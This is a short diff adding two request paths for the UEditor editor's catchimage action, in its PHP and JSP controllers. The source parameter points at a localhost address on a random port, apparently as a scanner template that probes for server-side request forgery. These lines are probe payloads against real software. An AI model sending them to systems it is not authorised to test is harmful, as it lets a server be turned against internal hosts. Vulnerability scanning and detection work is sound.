@@ -1,0 +1,2 @@
+/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png
+/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png
